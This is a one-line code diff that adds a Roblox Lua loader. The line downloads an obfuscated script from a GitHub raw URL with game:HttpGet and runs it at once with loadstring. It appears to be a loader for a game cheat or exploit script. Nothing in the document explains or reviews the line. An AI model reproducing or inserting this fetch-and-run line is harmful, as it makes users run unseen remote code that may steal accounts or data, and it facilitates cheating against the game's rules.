@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Hikkaxxx/blox/main/obf_ImWslV87568aY6TrD8rme4Y4n1C2E72ZFEJF0iR6N8l72V3K3218FJCk2BnUvc34.lua'))()
